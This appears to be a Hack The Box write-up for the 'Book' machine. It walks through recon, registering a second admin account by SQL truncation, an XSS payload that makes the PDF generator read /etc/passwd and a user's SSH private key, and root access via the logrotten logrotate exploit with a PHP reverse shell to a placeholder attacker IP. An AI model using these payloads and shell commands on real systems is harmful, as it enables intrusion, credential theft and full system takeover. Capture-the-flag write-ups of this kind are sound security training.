From the nmap scan we can see that there are just 2 ports open, we see know that anonymous login for SSH isn't allowed as the nmap scan would of picked that up due to us running the`-sC` flag to execute scripts. So we shall then navigate to the website.



## Foothold

When arriving at the site we are greeted with a login portal, where we can both login and create an account. So we create an account and then take a look around the site. 

![image-20200710140359346](C:\Users\Tristan\AppData\Roaming\Typora\typora-user-images\image-20200710140359346.png)

As we can see there are a few aspects to the website and one aspect which catches my eye is the ability to submit a Book. We can see that we can submit a Book Title, author and then upload a file. Meaning we may be able to upload a reverse shell of some sort. However I had no success with this, one other thing I noticed and put into my notes was that within the `Contact Us` page it stated that to contact an admin it would send an email to `admin@book.htb` therefore we can now try and login in as the admin as we know what email they used. After running a dirb scan I found this:

```bash
bros@Bros10:~/HTB/Book$ dirb http://10.10.10.176/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Jul 10 15:07:13 2020
URL_BASE: http://10.10.10.176/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.176/ ----
==> DIRECTORY: http://10.10.10.176/admin/ 
```

So we go over to `/admin` and attempt to authenticate our self as an admin, now we could brute force this form but that's never the correct way for a HTB machine so the initial thing I try is simple SQL injection but get no success. I then also tried sqlmap but that had 0 success, after reading through some checklists and articles around bypassing login forms I came across SQL Truncation. After some research I found that if MySQL is running in default mode, the database column is limited to 20 characters so any string past 20 characters would be truncated by MySQL. As MySQL doesn't compare strings in binary mode it results in seeing  "admin " and "admin" as the same string, so it wouldn't accept a new user named "admin ". However if a user inputs "admin               .", which is 21 characters, then it will be seen as a different username and would be accepted inserted it into the database. But the 21 character string would be cut down to 20 characters turning the string from "admin               ." to "admin               ". This results in MySQL comparing both strings in non binary mode, allowing you to create a 2nd admin account with a set of credentials you set.



Now we shall take this vulnerability and convert it to work within this Box, we notice that the unique identifier for an account is the email and not the username. Therefore we can create a new account with any username and just set the email as `admin@book.htb      A`

![image-20200710161608408](C:\Users\Tristan\AppData\Roaming\Typora\typora-user-images\image-20200710161608408.png)

However there is some validation within this form for the email aspect so we remove the spaces and the `A`, turn on our Burp proxy and intercept the request and edit the Raw POST request.  We make these changes to the POST parameters: `name=bros&email=admin%40book.htb      A&password=bros`. This results in the email being 21 characters long, the application will compare this email which now is `admin@book.htb      A` to any other email addresses within the database but won't get a match as strings are compared in non binary mode. Allowing the information to be inserted into the database. However due to it's length the string will be truncated, removing the A, creating a new user named `bros` who's email is also `admin@book.htb` meaning we can login into the admin panel using `admin@book.htb` and our password which is `bros`. Here is what the Admin Panel looked like: 

![image-20200711133503688](C:\Users\Tristan\AppData\Roaming\Typora\typora-user-images\image-20200711133503688.png)



 Where we can navigate to `Collections` and this is what we can see:

![image-20200711133622188](C:\Users\Tristan\AppData\Roaming\Typora\typora-user-images\image-20200711133622188.png)

Here we can download the PDF of users and Collections. Now we know that within the Library aspect of the source we can upload a "Book" to the Collections tab, where we can put a "Book Title", "Author" and a file. 



After doing some research I came across this [article](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html) which allows an attacker to abuse XSS to obtain a local file which is then output as a pdf. After a few attempts this payload worked while also uploading a text file as the file.  

```bash
bros@Bros10:~/HTB/Book$ cat file.txt 
PleaseReadMyWriteup
```

Payload: 

```html
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

![image-20200711140543670](C:\Users\Tristan\AppData\Roaming\Typora\typora-user-images\image-20200711140543670.png)



After clicking upload we go over to our Admin tab where we refresh and then download both the PDF's for Collections and Users. Once we open up the PDF from Collections we get the output of `/etc/passwd` 

```bash
root:x:0:0:root:/root:/bin/bash

```

So we now know that we can output contents of Local files, so while looking at `/etc/passwd` I noticed this user: `reader:x:1000:1000:reader:/home/reader:/bin/bash` who was most likely the user responsible for hosting the web server. Therefore I attempted to grab the private SSH key which should be at this location `/home/reader/.ssh/id_rsa` which we can confirm the location of by testing it locally.

```bash
bros@Bros10:~/.ssh$ ls
id_rsa  id_rsa.pub  known_hosts
bros@Bros10:~/.ssh$ pwd
/home/bros/.ssh
```

After uploading the same text file and changing the payload to this: `<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>`. We succeed and when we download the PDF and open it up using Chrome we copy and paste the contents and obtain the private SSH key.

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ
-----END RSA PRIVATE KEY-----
```



## User

SSH in as reader and obtain the User flag.

```bash
bros@Bros10:~/HTB/Book$ ls
file.txt  id_rsa  scans.gnmap  scans.nmap  scans.xml
bros@Bros10:~/HTB/Book$ chmod 600 id_rsa 
bros@Bros10:~/HTB/Book$ ssh -i id_rsa reader@10.10.10.176
reader@book:~$ ls
backups  lse.sh  user.txt
reader@book:~$ cat user.txt 
51c
```



## Root

We begin the process of Privilege Escalation by getting linpeas onto the machine.

```bash
curl http://10.10.14.36:8000/linpeas.sh -o linpeas.sh
```



```bash
bros@Bros10:~/HTB/Tools$ ls
LinEnum.sh  linpeas.sh
bros@Bros10:~/HTB/Tools$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.176 - - [11/Jul/2020 17:50:51] "GET /linpeas.sh HTTP/1.1" 200 -
```

And then once we run it we find this:

```bash
[+] Writable log files (logrotten) (limit 100)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
#)You_can_write_more_log_files_inside_last_directory
#)You_can_write_more_log_files_inside_last_directory
#)You_can_write_more_log_files_inside_last_directory
Writable: /home/reader/backups/access.log
```

After reading the article from the link provided and then finding a PoC I clone the git repo.

```bash
bros@Bros10:~/HTB/Book$ git clone https://github.com/whotwagner/logrotten
```

Compile the PoC and then serve it using python again.

```bash
bros@Bros10:~/HTB/Book/logrotten$ gcc logrotten.c -o logrotten
bros@Bros10:~/HTB/Book/logrotten$ python3 -m http.server
```

```bash
reader@book:~$ vim shell
reader@book:~$ cat shell
php -r '$sock=fsockopen("10.10.xx.xx",2222);exec("/bin/sh -i <&3 >&3 2>&3");'
```

As a reminder you need to insert your IP address within the reverse shell above. 

```bash
reader@book:~$ ./logrotten -p ./shell /home/reader/backups/access.log
```

The `-p` flag specifies the payload, meaning our PHP reverse shell should be executed by root. However this won't occur straight away as we've got to wait till root executes logrotate. We can make logrotate occur by creating and running this quick bash scripts within the `/backups` folder. 

```bash
#!/bin/bash

while true; do
	sleep 100
	echo "AAAA" > access.log
done
```

Then in another terminal we shall set a listener on port 2222 and wait for a connection.

```bash
bros@Bros10:~/HTB/Book/logrotten$ nc -lvnp 2222
listening on [any] 2222 ...
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.176] 59792
# whoami
root
# cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----

-----END RSA PRIVATE KEY-----
# Hangup
```

As we can see above the Shell is very unstable and drops within a few seconds, so to get a stable shell I did ran `ls -lah` and noticed the `.ssh` directory therefore outputted the value of the Root RSA private key. Allowing me to copy and paste the private key into `id_rsa` on my local machine.

```bash
bros@Bros10:~/HTB/Tools/root$ chmod 600 id_rsa 
bros@Bros10:~/HTB/Tools/root$ ssh -i id_rsa root@10.10.10.176

## Conclusion



Found two ports open upon our initial scan, we then move onto the Website where we can Login, create an account. Once we created a test account we navigate to a `Contact Us` page where we noticed the `admin@book.htb ` email. We also had the functionality to upload a book which includes a Book title, author and the file itself. From there we use dirb to find the `/admin` which we know we could login using the admins email address. We creating an Admin account with our own username and credentials by using SQL Truncation and then use XSS to read local files by rendering them within a PDF utilising the user Book upload feature and the admin PDF download for collections of books. From there we obtain the users SSH private key and SSH in. To obtain root we abuse logrotate to execute a PHP reverse shell allowing us to grab the roots SSH private key.
